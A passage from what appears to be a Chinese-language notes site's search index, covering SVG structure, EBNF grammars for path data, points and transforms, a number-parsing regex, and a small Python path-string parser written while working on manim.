\u53c2\u6570\uff1a(rx ry x-axis-rotation large-arc-flag sweep-flag x y)+ \u7528\u6cd5\uff1a rx, ry\uff1a\u692d\u5706\u5f27\u7684\u6c34\u5e73\u548c\u5782\u76f4\u534a\u5f84 x-axis-rotation\uff1a\u4e00\u4e2a\u89d2\u5ea6\uff0c\u4ee5 deg \u4e3a\u5355\u4f4d\uff0c\u8868\u793a x \u8f74\u65cb\u8f6c\u89d2\u5ea6 large-arc-flag: 0 \u6216 1\uff0c\u662f 0 \u8868\u793a\u8fd9\u6bb5\u692d\u5706\u5f27\u5e94\u8be5\u662f\u52a3\u5f27\uff0c1 \u8868\u793a\u8fd9\u6bb5\u692d\u5706\u5f27\u5e94\u8be5\u662f\u4f18\u5f27 sweep-flag\uff1a0 \u6216 1\uff0c\u662f 0 \u8868\u793a\u4ece\u8d77\u70b9\u5230\u7ec8\u70b9\u6cbf\u9006\u65f6\u9488\u753b\u5f27\uff0c1 \u8868\u793a\u4ece\u8d77\u70b9\u5230\u7ec8\u70b9\u987a\u65f6\u9488\u753b\u5f27 x, y\uff1a\u7ec8\u70b9\u5750\u6807 A \u547d\u4ee4\u4f8b\u5b50 EBNF \u8bed\u6cd5 \u00b6 d \u5c5e\u6027\u91cc\u7684\u662f svg-path \u7c7b\u578b\uff0c\u5b9a\u4e49\u662f\uff1a svg-path : wsp * moveto-drawto-command-groups ? wsp * moveto-drawto-command-groups : moveto-drawto-command-group | moveto-drawto-command-group wsp * moveto-drawto-command-groups moveto-drawto-command-group : moveto wsp * drawto-commands ? drawto-commands : drawto-command | drawto-command wsp * drawto-commands drawto-command : closepath | lineto | horizontal-lineto | vertical-lineto | curveto | smooth-curveto | quadratic-bezier-curveto | smooth-quadratic-bezier-curveto | elliptical-arc drawto-command: \u9664\u4e86 M/m \u4ee5\u5916\u7684 9 \u79cd\u547d\u4ee4\u5b57\u7b26\u4e32 drawto-commands: \u7528\u4efb\u610f\u591a\uff08\u53ef\u4e3a0\uff09 wsp \u5206\u9694\u7684 drawto-command moveto-drawto-command-group: moveto \u547d\u4ee4\u5f00\u5934\u7684\u547d\u4ee4\u7ec4\uff08\u7528\u4e8e\u6307\u5b9a\u4e00\u4e2a\u5b50\u8def\u5f84\uff09\uff0c\u53ef\u4ee5\u4ec5\u6709 moveto\uff0c\u4e5f\u53ef\u4ee5\u662f\u7531\u4efb\u610f\u591a\uff08\u53ef\u7701\u7565\uff09wsp \u5206\u9694\u7684\u4e00\u4e9b\u547d\u4ee4 moveto-drawto-command-groups: \u5b50\u8def\u5f84\u96c6\u5408\uff0c\u7528\u4efb\u610f\u591a\uff08\u53ef\u7701\u7565\uff09wsp \u5206\u9694\u7684 moveto-drawto-command-group svg-path: \u53ef\u4ee5\u4e3a \u7a7a / \u5f00\u5934\u7ed3\u5c3e\u6709\u4efb\u610f\u591a wsp \u7684 moveto-drawto-command-groups \u4e0b\u9762\u662f\u5404\u4e2a\u547d\u4ee4\u7684\u8bed\u6cd5\uff0c\u90fd\u6bd4\u8f83\u6e05\u6670\uff0c\u5c31\u4e0d\u591a\u89e3\u91ca\u4e86\uff1a \u5404\u4e2a\u547d\u4ee4\u7684\u8bed\u6cd5 moveto : ( \" M \" | \" m \" ) wsp * moveto-argument-sequence moveto-argument-sequence : coordinate-pair | coordinate-pair comma-wsp ? lineto-argument-sequence closepath : (\" Z \" | \" z \") lineto : ( \" L \" | \" l \" ) wsp * lineto-argument-sequence lineto-argument-sequence : coordinate-pair | coordinate-pair comma-wsp ? lineto-argument-sequence horizontal-lineto : ( \" H \" | \" h \" ) wsp * horizontal-lineto-argument-sequence horizontal-lineto-argument-sequence : coordinate | coordinate comma-wsp ? horizontal-lineto-argument-sequence vertical-lineto : ( \" V \" | \" v \" ) wsp * vertical-lineto-argument-sequence vertical-lineto-argument-sequence : coordinate | coordinate comma-wsp ? vertical-lineto-argument-sequence curveto : ( \" C \" | \" c \" ) wsp * curveto-argument-sequence curveto-argument-sequence : curveto-argument | curveto-argument comma-wsp ? curveto-argument-sequence curveto-argument : coordinate-pair comma-wsp ? coordinate-pair comma-wsp ? coordinate-pair smooth-curveto : ( \" S \" | \" s \" ) wsp * smooth-curveto-argument-sequence smooth-curveto-argument-sequence : smooth-curveto-argument | smooth-curveto-argument comma-wsp ? smooth-curveto-argument-sequence smooth-curveto-argument : coordinate-pair comma-wsp ? coordinate-pair quadratic-bezier-curveto : ( \" Q \" | \" q \" ) wsp * quadratic-bezier-curveto-argument-sequence quadratic-bezier-curveto-argument-sequence : quadratic-bezier-curveto-argument | quadratic-bezier-curveto-argument comma-wsp ? quadratic-bezier-curveto-argument-sequence quadratic-bezier-curveto-argument : coordinate-pair comma-wsp ? coordinate-pair smooth-quadratic-bezier-curveto : ( \" T \" | \" t \" ) wsp * smooth-quadratic-bezier-curveto-argument-sequence smooth-quadratic-bezier-curveto-argument-sequence : coordinate-pair | coordinate-pair comma-wsp ? smooth-quadratic-bezier-curveto-argument-sequence elliptical-arc : ( \" A \" | \" a \" ) wsp * elliptical-arc-argument-sequence elliptical-arc-argument-sequence : elliptical-arc-argument | elliptical-arc-argument comma-wsp ? elliptical-arc-argument-sequence elliptical-arc-argument : nonnegative-number comma-wsp ? nonnegative-number comma-wsp ? number comma-wsp flag comma-wsp ? flag comma-wsp ? coordinate-pair flag : \"0\" | \"1\" path string parser \u00b6 python \u5199\u7684 path string \u89e3\u6790 class InvalidPathError ( ValueError ): pass class _PathStringParser : # modified from https://github.com/regebro/svg.path/ def __init__ ( self , arguments , rules ): self . args = [] arguments = bytearray ( arguments , \"ascii\" ) self . _strip_array ( arguments ) while arguments : for rule in rules : self . _rule_to_function_map [ rule ]( arguments ) @property def _rule_to_function_map ( self ): return { \"x\" : self . _get_number , \"y\" : self . _get_number , \"a\" : self . _get_number , \"u\" : self . _get_unsigned_number , \"f\" : self . _get_flag , } def _strip_array ( self , arg_array ): # wsp: (0x9, 0x20, 0xA, 0xC, 0xD) with comma 0x2C # https://www.w3.org/TR/SVG/paths.html#PathDataBNF while arg_array and arg_array [ 0 ] in [ 0x9 , 0x20 , 0xA , 0xC , 0xD , 0x2C ]: arg_array [ 0 : 1 ] = b \"\" def _get_number ( self , arg_array ): pattern = re . compile ( rb \"^[-+]?(?:\\d+(?:\\.\\d*)?|\\.\\d+)(?:[eE][-+]?\\d+)?\" ) res = pattern . search ( arg_array ) if not res : raise InvalidPathError ( f \"Expected a number, got ' { arg_array } '\" ) number = float ( res . group ()) self . args . append ( number ) arg_array [ res . start (): res . end ()] = b \"\" self . _strip_array ( arg_array ) return number def _get_unsigned_number ( self , arg_array ): number = self . _get_number ( arg_array ) if number < 0 : raise InvalidPathError ( f \"Expected an unsigned number, got ' { number } '\" ) return number def _get_flag ( self , arg_array ): flag = arg_array [ 0 ] if flag != 48 and flag != 49 : raise InvalidPathError ( f \"Expected a flag (0/1), got ' { chr ( flag ) } '\" ) flag -= 48 self . args . append ( flag ) arg_array [ 0 : 1 ] = b \"\" self . _strip_array ( arg_array ) return flag transform \u7684\u5904\u7406 \u00b6 transform \u662f\u5bf9\u5f53\u524d\u5143\u7d20\u53ca\u5176\u5b50\u5143\u7d20\u7684\u6574\u4e2a\u5750\u6807\u7cfb\u8fdb\u884c\u7684\u53d8\u6362\uff0c\u4ece\u5de6\u5411\u53f3\u7ed3\u5408 \u6240\u4ee5\u4e5f\u5c31\u53ef\u4ee5\u770b\u505a\u5bf9\u5143\u7d20\u5e94\u7528 transform\uff0c\u4f46\u662f\u4ece\u53f3\u5411\u5de6\u7ed3\u5408 \u6240\u6709\u7684 transform \u90fd\u53ef\u4ee5\u770b\u6210\u4e00\u4e2a 3 \u9636\u77e9\u9635\uff1a \\[\\begin{bmatrix} a & c & e \\\\ b & d & f \\\\ 0 & 0 & 1 \\end{bmatrix}\\] \u4f5c\u7528\u65b9\u5f0f\u662f\uff1a \\[ \\begin{bmatrix} x_\\text{prevCoordSys} \\\\ y_\\text{prevCoordSys} \\\\ 1 \\end{bmatrix} = \\begin{bmatrix} a & c & e \\\\ b & d & f \\\\ 0 & 0 & 1 \\end{bmatrix}\\cdot \\begin{bmatrix} x_\\text{newCoordSys} \\\\ y_\\text{newCoordSys} \\\\ 1 \\end{bmatrix} \\] \u5176\u4e2d \\((x_\\text{prevCoordSys}, y_\\text{prevCoordSys})\\) \u8868\u793a\u5728 transform \u524d\u7684\u5750\u6807\u7cfb\u7edf\u4e0b\u7684\u5750\u6807\uff0c\u8fd9\u4e2a 3 \u9636 transform \u7684\u77e9\u9635\u8bb0\u4e3a [a b c d e f] SVG \u4e00\u5171\u652f\u6301\u516d\u79cd transform\uff0c\u4e0b\u9762\u5177\u4f53\u6765\u8bf4\uff1a matrix(a b c d e f): \u65bd\u52a0\u77e9\u9635 [a b c d e f] \u4f5c\u7528 translate(tx [ty]): \u5e73\u79fb\uff0cx \u8f74\u79fb tx\uff0cy \u8f74\u79fb ty\uff0c\u5982\u679c\u6ca1\u6709 ty \u5c31\u662f 0\u3002\u76f8\u5f53\u4e8e\u77e9\u9635 [1 0 0 1 tx ty] scale(sx [sy]): \u7f29\u653e\uff0cx \u8f74\u7f29\u653e sx \u500d\uff0cy \u8f74\u7f29\u653e sy \u500d\uff0c\u5982\u679c\u6ca1\u6709 sy\uff0c\u5219 sy \u548c sx \u76f8\u7b49\u3002\u76f8\u5f53\u4e8e\u77e9\u9635 [sx 0 0 sy 0 0] rotate(angle [cx cy]): \u987a\u65f6\u9488\u65cb\u8f6c angle \u5ea6\uff0c\u4ee5 cx cy \u4e3a\u4e2d\u5fc3\uff0c\u6ca1\u6709\u6307\u5b9a\u5c31\u662f\u539f\u70b9 rotate(angle cx cy) \u76f8\u5f53\u4e8e translate(cx cy) rotate(angle) translate(-cx -cy) rotate(a) \u76f8\u5f53\u4e8e\u77e9\u9635 [cos(a) sin(a) -sin(a) cos(a) 0 0] skewX(angle): x \u8f74\u503e\u659c angle \u5ea6\uff0c\u76f8\u5f53\u4e8e\u77e9\u9635 [1 0 tan(a) 1 0 0] skewY(angle): y \u8f74\u503e\u659c angle \u5ea6\uff0c\u76f8\u5f53\u4e8e\u77e9\u9635 [1 tan(a) 0 1 0 0] EBNF \u8bed\u6cd5 \u00b6 transform \u7684 EBNF \u8bed\u6cd5 transform-list : wsp * transforms ? wsp * transforms : transform | transform comma-wsp + transforms transform : matrix | translate | scale | rotate | skewX | skewY matrix : \" matrix \" wsp * \"(\" wsp * number comma-wsp number comma-wsp number comma-wsp number comma-wsp number comma-wsp number wsp * \")\" translate : \" translate \" wsp * \"(\" wsp * number ( comma-wsp number )? wsp * \")\" scale : \" scale \" wsp * \"(\" wsp * number ( comma-wsp number )? wsp * \")\" rotate : \" rotate \" wsp * \"(\" wsp * number ( comma-wsp number comma-wsp number )? wsp * \")\" skewX : \" skewX \" wsp * \"(\" wsp * number wsp * \")\" skewY : \" skewY \" wsp * \"(\" wsp * number wsp * \")\" \u6b63\u5219\u5339\u914d\u5206\u79bb transform: transform_pattern = re . compile ( \"|\" . join ([ x + r \"[^)]*\\)\" for x in transform_names ])) \u91cc\u9762\u7684 number \u90fd\u53ef\u4ee5\u7528\u5f00\u5934\u8bf4\u5230\u7684\u6b63\u5219\u6765\u5339\u914d \u6837\u5f0f \u00b6 \u9ed8\u8ba4\u6837\u5f0f\uff1a DEFAULT_STYLE = { \"fill\" : \"black\" , \"stroke\" : \"none\" , \"fill-opacity\" : \"1\" , \"stroke-opacity\" : \"1\" , \"stroke-width\" : 0 , } \u5269\u4e0b\u7684\u5c31\u662f\u6309\u7167 css \u7684\u89c4\u5219\u5c42\u53e0\u5c31\u597d\u4e86","title":"SVG"},{"location":"cs/web/svg/#svg","text":"Abstract SVG\uff08Scalable Vector Graphics\uff09\u662f\u4e00\u79cd\u57fa\u4e8e XML \u63cf\u8ff0\u77e2\u91cf\u56fe\u5f62\u7684\u56fe\u7247\u683c\u5f0f \u73b0\u884c\u6807\u51c6\u662f SVG 2\uff1a https://www.w3.org/TR/SVG/ SVG 1.1\uff1a https://www.w3.org/TR/SVG11/ SVG 2 \u4ecd\u5728 CR \u9636\u6bb5\uff0c\u533a\u522b\uff1a https://www.w3.org/TR/SVG/changes.html REC-SVG11-20110816.pdf SVG \u6807\u51c6\u6587\u6863\u8fd8\u6ca1\u6709\u5b8c\u6574\u8bfb\u8fc7\uff0c\u8fd9\u91cc\u53ea\u662f\u4e00\u4e9b\u5728\u4fee manim \u7684 SVGMobject \u7684\u65f6\u5019\u5b66\u5230\u7684 SVG \u76f8\u5173\u5185\u5bb9 SVG Namespace: http://www.w3.org/2000/svg Public Identifier for SVG 1.1: PUBLIC \"-//W3C//DTD SVG 1.1//EN\" System Identifier for the SVG 1.1 Recommendation: http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd","title":"SVG"},{"location":"cs/web/svg/#_1","text":"\u5de6\u4e0a\u89d2\u4e3a\u539f\u70b9\uff0c\u5411\u53f3\u4e3a x \u6b63\u65b9\u5411\uff0c\u5411\u4e0b\u4e3a y \u6b63\u65b9\u5411 transform \u5c5e\u6027\u4f1a\u6539\u53d8\u5143\u7d20\u53ca\u5176\u5b50\u5143\u7d20\u7684\u5750\u6807\u7cfb","title":"\u5750\u6807\u7cfb\u7edf"},{"location":"cs/web/svg/#ebnf","text":"\u4e00\u4e9b SVG \u7684 EBNF coordinate-pair : coordinate comma-wsp coordinate | coordinate negative-coordinate coordinate : number number : sign ? integer-constant | sign ? floating-point-constant negative-coordinate : \"-\" integer-constant | \"-\" floating-point-constant comma-wsp : ( wsp + comma ? wsp *) | ( comma wsp *) comma : \",\" integer-constant : digit-sequence floating-point-constant : fractional-constant exponent ? | digit-sequence exponent fractional-constant : digit-sequence ? \".\" digit-sequence | digit-sequence \".\" exponent : ( \" e \" | \" E \" ) sign ? digit-sequence sign : \"+\" | \"-\" digit-sequence : digit | digit digit-sequence digit : \"0\" | \"1\" | \"2\" | \"3\" | \"4\" | \"5\" | \"6\" | \"7\" | \"8\" | \"9\" wsp : (# x20 | # x9 | # xD | # xA )+ \u4ece\u540e\u5f80\u524d\u6765\u770b\uff1a wsp\uff1a\u7a7a\u683c\uff0c\u5305\u542b\u56db\u79cd\uff0cASCII \u7801\u503c\u4e3a 0x9, 0x20, 0xA, 0xD \uff08SVG2 \u4e2d\u591a\u4e86 0xC \uff09\uff0c\u5e76\u4e14\u53ef\u4ee5\u8fde\u7eed\u591a\u4e2a digit: \u6570\u5b57\u5b57\u7b26\uff0c0 \u5230 9 digit-sequence: \u6570\u5b57\u5b57\u7b26\u5e8f\u5217\uff0c\u53ef\u4ee5\u4e3a\u5355\u4e2a\u6216\u8005\u591a\u4e2a\u6570\u5b57\u5b57\u7b26 sign: \u7b26\u53f7\uff0c+ \u6216 - exponent: \u6307\u6570\uff0ce \u5927\u5c0f\u5199\u5747\u53ef\uff0c\u6307\u6570\u662f\u6709\u7b26\u53f7\u6216\u8005\u65e0\u7b26\u53f7\uff08\u5373\u6b63\uff09\u6574\u6570\uff0c\u5982 e2 E+2 E-10 \u5747\u4e3a\u5408\u6cd5 exponent fractional-constant: \u5206\u6570\u5e38\u6570\uff0c\u6574\u6570\u90e8\u5206\u4e3a 0 \u53ef\u4ee5\u7701\u7565\uff0c\u5c0f\u6570\u90e8\u5206\u4e3a 0 \u4e5f\u53ef\u4ee5\u7701\u7565\uff0c\u5982 1.2 .3 4. \u53ef\u4ee5\u8868\u793a\u4e09\u4e2a\u5206\u6570\u5e38\u6570 1.2, 0.3, 4.0 floating-point-constant: \u6d6e\u70b9\u6570\u5e38\u6570\uff0c\u53ef\u4ee5\u662f \u5206\u6570\u5e38\u6570 / \u5206\u6570\u5e38\u6570\u52a0\u6307\u6570 / \u6574\u6570\u5e38\u6570\u52a0\u6307\u6570 integer-constant: \u6574\u6570\u5e38\u6570\uff0c\u5373\u6570\u5b57\u5b57\u7b26\u5e8f\u5217 comma: \u9017\u53f7\u5b57\u7b26 , \uff0cASCII \u7801\u503c 0x2C comma-wsp: \u95f4\u9694\u7b26\uff0c\u53ef\u4ee5\u662f \u9017\u53f7 / \u9017\u53f7\u52a0\u4efb\u610f\u591a\u7a7a\u683c / \u4efb\u610f\u591a\u7a7a\u683c / \u4efb\u610f\u591a\u7a7a\u683c\u52a0\u9017\u53f7\u52a0\u4efb\u610f\u591a\u7a7a\u683c negative-coordinate: \u8d1f\u5750\u6807\u503c\uff0c\u53ef\u4ee5\u662f \u8d1f\u53f7\u52a0\u6574\u6570\u5e38\u6570 / \u8d1f\u53f7\u52a0\u6d6e\u70b9\u6570\u5e38\u6570 number: \u6570\u5b57\uff0c\u6709\u7b26\u53f7\u6216\u8005\u65e0\u7b26\u53f7\uff08\u6b63\uff09\u7684\u6574\u6570\u5e38\u6570\u6216\u8005\u6d6e\u70b9\u6570\u5e38\u6570 coordinate: \u5750\u6807\u503c\uff0c\u5373\u6570\u5b57 number coordinate-pair: \u5750\u6807\uff0c\u53ef\u4ee5\u662f\u4e24\u4e2a\u7528 comma-wsp \u5206\u9694\u7684\u5750\u6807\u503c\uff0c\u7b2c\u4e8c\u4e2a\u5750\u6807\u503c\u4e3a\u8d1f\u7684\u65f6\u5019\u53ef\u4ee5\u4e0d\u8fdb\u884c\u5206\u9694\uff0c\u5373 1-2 \u8868\u793a (1, -2)","title":"\u5e38\u89c1 EBNF \u8bed\u6cd5"},{"location":"cs/web/svg/#_2","text":"\u4ece\u5b57\u7b26\u4e32\u4e2d\u8bfb\u53d6\u51fa\u4e0a\u9762\u7684 number \u53ef\u4ee5\u76f4\u63a5\u7528\u4e00\u4e2a\u6b63\u5219\u6765\u89e3\u51b3\uff1a [-+]?(?:\\d+(?:\\.\\d*)?|\\.\\d+)(?:[eE][-+]?\\d+)? \u4e5f\u5c31\u662f\u4e0a\u9762\u7684\u6574\u4e2a\u903b\u8f91 \u6574\u4f53\u53ef\u4ee5\u662f +- \u6216\u8005\u4e0d\u6307\u5b9a\uff1a [-+]? \u6307\u6570\u524d\u90e8\u5206\uff1a (?:\\d+(?:\\.\\d*)?|\\.\\d+) \u6709\u6574\u6570\u90e8\u5206\uff1a \\d+(?:\\.\\d*)? \u6574\u6570\u90e8\u5206\uff1a \\d+ \u5c0f\u6570\u90e8\u5206\uff08\u53ef\u6709\u53ef\u65e0\uff09\uff1a (?:\\.\\d*)? \u5c0f\u6570\u70b9\uff1a \\. \u5c0f\u6570\u90e8\u5206\uff08\u53ef\u6709\u53ef\u65e0\uff09\uff1a \\d* \u65e0\u6574\u6570\u90e8\u5206\uff08\u5373\u5ffd\u7565 0\uff09\uff1a \\.\\d+ \u5c0f\u6570\u70b9\uff1a \\. \u5c0f\u6570\u90e8\u5206\uff08\u4e00\u5b9a\u6709\uff09\uff1a \\d+ \u6307\u6570\u90e8\u5206\uff08\u53ef\u6709\u53ef\u65e0\uff09\uff1a (?:[eE][-+]?\\d+)? \u6307\u6570\u6807\u8bc6\uff1a [eE] \u7b26\u53f7\uff08\u53ef\u6709\u53ef\u65e0\uff09\uff1a [-+]? \u6307\u6570\u90e8\u5206\uff08\u4e00\u5b9a\u6709\uff0c\u4e14\u662f\u6574\u6570\uff09\uff1a \\d+ \u4e3a\u4e86\u4e0d\u6355\u83b7 () \u4e2d\u7684\u5185\u5bb9\uff0c\u9700\u8981\u4f7f\u7528 (?:) \u4f7f\u7528\u7684\u65f6\u5019\u76f4\u63a5\u628a\u5339\u914d\u5230\u7684\u5185\u5bb9\u4f20\u5165 float \u5373\u53ef\uff1a number_pattern = re . compile ( r \"[-+]?(?:\\d+(?:\\.\\d*)?|\\.\\d+)(?:[eE][-+]?\\d+)?\" ) numbers = [ float ( x ) for x in number_pattern . findall ( number_string )]","title":"\u8bfb\u53d6\u6570\u5b57\u7684\u6b63\u5219\u8868\u8fbe\u5f0f"},{"location":"cs/web/svg/#svg_1","text":"\u5728\u4e00\u4e2a SVG \u4e2d\uff0c\u53ef\u4ee5\u6709\u5f88\u591a <svg> \u5143\u7d20\uff0c\u6700\u5916\u5c42\u53ea\u6709\u4e00\u4e2a <svg> \u5143\u7d20\uff0c\u5185\u5c42\u53ef\u4ee5\u5d4c\u5957 svg \u89c4\u5b9a\u7684\u5143\u7d20\u90fd\u5728 XML \u547d\u540d\u7a7a\u95f4 http://www.w3.org/2000/svg \u4e2d\uff0c\u6240\u4ee5\u8981\u89c4\u5b9a xmlns=\"http://www.w3.org/2000/svg\" \u5c5e\u6027\uff1a version \u7248\u672c\u53f7\uff0c1.1 / 1.0 x \u5bf9\u4e8e\u6700\u5916\u5c42 svg \u5143\u7d20\u6ca1\u6709\u4f5c\u7528\uff0c\u5bf9\u4e8e\u5185\u5c42 svg \u5143\u7d20\u6307\u5b9a\u8fb9\u754c\u7684\u5de6\u4e0a\u89d2\u7684 x \u5750\u6807 y \u5bf9\u4e8e\u6700\u5916\u5c42 svg \u5143\u7d20\u6ca1\u6709\u4f5c\u7528\uff0c\u5bf9\u4e8e\u5185\u5c42 svg \u5143\u7d20\u6307\u5b9a\u8fb9\u754c\u7684\u5de6\u4e0a\u89d2\u7684 y \u5750\u6807 width \u89c4\u5b9a\u5bbd\u5ea6\uff0c\u53ef\u4ee5\u662f\u957f\u5ea6\u6216\u8005\u767e\u5206\u6bd4 height \u89c4\u5b9a\u9ad8\u5ea6","title":"&lt;svg> \u5143\u7d20"},{"location":"cs/web/svg/#_3","text":"<g>\uff1a\u5373 group\uff0c\u53ef\u4ee5\u6709\u5b50\u5143\u7d20\uff0c\u5e76\u4e14\u53ef\u4ee5\u6709 id \u7528\u6765\u5f15\u7528 <defs>\uff1a\u5305\u542b\u4e00\u4e9b\u5b50\u5143\u7d20\uff0c\u7528\u6765\u590d\u7528\uff0c\u4e0d\u76f4\u63a5\u663e\u793a <symbol>\uff1a\u7c7b\u4f3c <g> <use>\uff1a\u590d\u7528\uff0c\u901a\u8fc7 xlink:href \u6765\u6307\u5b9a\u5f15\u7528\u5bf9\u8c61\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f7f\u7528 x, y, style \u7b49\u4e00\u7cfb\u5217\u5c5e\u6027\u6765\u89c4\u5b9a\u4f4d\u7f6e\u548c\u6837\u5f0f","title":"\u5176\u4ed6\u7ed3\u6784\u5143\u7d20"},{"location":"cs/web/svg/#_4","text":"\u5143\u7d20 \u5c5e\u6027 <rect> x, y \u5de6\u4e0a\u89d2\u5750\u6807 width, height \u77e9\u5f62\u5bbd\u9ad8 <circle> cx, cy \u5706\u5fc3\u5750\u6807 r \u5706\u534a\u5f84 <ellipse> cx, cy \u692d\u5706\u4e2d\u5fc3\u5750\u6807 rx, ry \u6c34\u5e73/\u5782\u76f4\u534a\u5f84 <line> x1, y1 \u8d77\u70b9\u5750\u6807 x2, y2 \u7ec8\u70b9\u5750\u6807 <polygon> points \u591a\u8fb9\u5f62\u7aef\u70b9\u5750\u6807 <polyline> points \u6298\u7ebf\u7aef\u70b9\u5750\u6807 <path> d \u8def\u5f84\u6307\u4ee4","title":"\u5f62\u72b6\u5143\u7d20"},{"location":"cs/web/svg/#polygon-polyline-points","text":"EBNF \u8bed\u6cd5 \u5b83\u4eec\u7684 points \u5c5e\u6027\u7684\u503c\u90fd\u662f list-of-points \u7c7b\u578b list-of-points : wsp * coordinate-pairs ? wsp * coordinate-pairs : coordinate-pair | coordinate-pair comma-wsp coordinate-pairs \u7531\u4e0a\u9762\u7684\u89e3\u91ca\u540c\u7406\uff0c\u8fd9\u4e2a EBNF \u4e5f\u975e\u5e38\u6e05\u6670 coordinate-pairs: \u5750\u6807\u7ec4\uff0c\u7528 comma-wsp \u5206\u9694\u7684\u591a\u4e2a\u5750\u6807 list-of-points: \u70b9\u96c6\uff0c\u53ef\u4ee5\u662f \u7a7a / \u4efb\u610f\u591a\u7a7a\u683c / \u524d\u540e\u6709\u4efb\u610f\u591a\u7a7a\u683c\uff08\u542b0\uff09\u7684\u5750\u6807\u7ec4 points \u4e5f\u53ef\u4ee5\u76f4\u63a5\u8f6c\u6362\u4e3a path string\uff0cmanim \u4e2d\u5c31\u662f\u8fd9\u6837\u5904\u7406\u7684\uff0c\u5373\u628a\u6240\u6709 wsp digit \u90fd\u66ff\u6362\u4e3a \"L\" wsp digit\uff0c\u7136\u540e\u628a\u7b2c\u4e00\u4e2a L \u66ff\u6362\u4e3a M","title":"&lt;polygon> \u548c &lt;polyline> \u7684 points \u8bed\u6cd5"},{"location":"cs/web/svg/#path","text":"<path> \u5143\u7d20\u901a\u8fc7\u5b83\u7684 d \u5c5e\u6027\u6765\u6307\u5b9a\u8def\u5f84\uff0c\u503c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32 \u8fd9\u4e2a\u8def\u5f84\u5b57\u7b26\u4e32\u7531\u4e00\u4e9b\u63a7\u5236\u547d\u4ee4\u548c\u540e\u9762\u63a5\u7740\u7684\u53c2\u6570\u6784\u6210\uff0c\u4e00\u5171\u5341\u79cd\u63a7\u5236\u547d\u4ee4\uff0c\u5206\u522b\u6709\u5927\u5199\u548c\u5c0f\u5199\u7684\u5f62\u5f0f \u5927\u5199\u8868\u793a\u540e\u9762\u7684\u53c2\u6570\u91cc\u7684\u5750\u6807\u662f\u7edd\u5bf9\u4f4d\u7f6e\uff0c\u5c0f\u5199\u8868\u793a\u540e\u9762\u7684\u53c2\u6570\u91cc\u7684\u5750\u6807\u662f\u76f8\u5bf9\u4e8e\u5f53\u524d\u5750\u6807\u7684\u76f8\u5bf9\u4f4d\u7f6e \u5e76\u4e14\u4e3a\u4e86\u538b\u7f29 SVG \u7684\u5927\u5c0f\uff0c\u4e5f\u6709\u4e00\u4e9b\u5141\u8bb8\u7684\u7f29\u5199\u89c4\u5219\uff1a \u53ef\u4ee5\u7701\u7565\u4e0d\u5fc5\u8981\u7684 comma-wsp \u5206\u9694\u7b26 \u5982\u679c\u591a\u6b21\u4f7f\u7528\u540c\u4e00\u4e2a\u547d\u4ee4\uff0c\u5219\u9664\u4e86\u7b2c\u4e00\u6b21\u4ee5\u5916\u5747\u53ef\u4ee5\u7701\u7565\u547d\u4ee4 \u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u5750\u6807 \u53ef\u4ee5\u4f7f\u7528\u6c34\u5e73\u548c\u5782\u76f4\u60c5\u51b5\u7684 lineto \u53ef\u4ee5\u7528 S/s/T/t \u6765\u7701\u7565\u7b2c\u4e00\u4e2a\u63a7\u5236\u70b9 \u4e0b\u9762\u4f9d\u6b21\u6765\u8bf4\u660e\u8fd9\u5341\u79cd\u63a7\u5236\u547d\u4ee4\uff1a \u547d\u4ee4 \u540d\u79f0 \u53c2\u6570 \u63cf\u8ff0 M or m moveto (x y)+ \u5f00\u542f\u4e00\u4e2a\u65b0\u7684\u8def\u5f84\uff0c\u53c2\u6570\u662f\u8d77\u70b9\u5750\u6807 \u5982\u679c\u53c2\u6570\u662f\u591a\u7ec4\u5750\u6807\uff0c\u5219\u9664\u7b2c\u4e00\u4e2a\u4ee5\u5916\u90fd\u5f53\u6210 L/l \u6307\u4ee4\u7684\u53c2\u6570\u6765\u5904\u7406 Z or z closepath \u5173\u95ed\u8def\u5f84\uff0c\u5373\u4ece\u5f53\u524d\u70b9\u5230\u5f53\u524d\u5b50\u8def\u5f84\u5f00\u5934\u70b9\u753b\u4e00\u6761\u76f4\u7ebf Z \u548c z \u7684\u6548\u679c\u76f8\u540c L or l lineto (x y)+ \u4ece\u5f53\u524d\u70b9\u5f00\u59cb\u753b\u76f4\u7ebf\uff0c\u53c2\u6570\u662f\u7aef\u70b9\u5750\u6807 H or h horizontal lineto x+ \u753b\u4e00\u6761\u6c34\u5e73\u7ebf\uff0c\u5230\u6a2a\u5750\u6807 x \u7684\u4f4d\u7f6e V or v vertical lineto y+ \u753b\u4e00\u6761\u7ad6\u76f4\u7ebf\uff0c\u5230\u7eb5\u5750\u6807 y \u7684\u4f4d\u7f6e C or c curveto (x1 y1 x2 y2 x y)+ \u4ece\u5f53\u524d\u70b9\u5230 (x, y) \u5229\u7528\u4e09\u9636\u8d1d\u585e\u5c14\u753b\u4e00\u6761\u66f2\u7ebf \u5176\u4e2d (x1, y1) \u662f\u5f53\u524d\u70b9\u7684\u63a7\u5236\u70b9\uff0c(x2, y2) \u662f\u7ed3\u675f\u70b9\u7684\u63a7\u5236\u70b9 S or s smooth curveto (x1 y1 x y)+ \u4ece\u5f53\u524d\u70b9\u5230 (x, y) \u5229\u7528\u4e09\u9636\u8d1d\u585e\u5c14\u753b\u4e00\u6761\u66f2\u7ebf \u5176\u4e2d\u5f53\u524d\u70b9\u7684\u63a7\u5236\u70b9\u662f\u4e0a\u4e00\u6761\u4e09\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\u7684\u7b2c\u4e8c\u4e2a\u63a7\u5236\u70b9\u5173\u4e8e\u5f53\u524d\u70b9\u7684\u4e2d\u5fc3\u5bf9\u79f0\u70b9\uff0c(x1, y1) \u662f\u7ed3\u675f\u70b9\u7684\u63a7\u5236\u70b9 \u5982\u679c\u6ca1\u6709\u4e0a\u4e00\u6761\u8def\u5f84\u6216\u8005\u4e0a\u4e00\u6761\u8def\u5f84\u4e0d\u662f\u4e09\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\uff08CcSs\uff09\uff0c\u5219\u5f53\u524d\u70b9\u7684\u63a7\u5236\u70b9\u5c31\u662f\u5f53\u524d\u70b9 Q or q quadratic bezier curveto (x1 y1 x y)+ \u4ece\u5f53\u524d\u70b9\u5230 (x, y) \u5229\u7528\u4e8c\u9636\u8d1d\u585e\u5c14\u753b\u4e00\u6761\u66f2\u7ebf \u5176\u4e2d (x1, y1) \u662f\u63a7\u5236\u70b9 T or t smooth quadratic bezier curveto (x y)+ 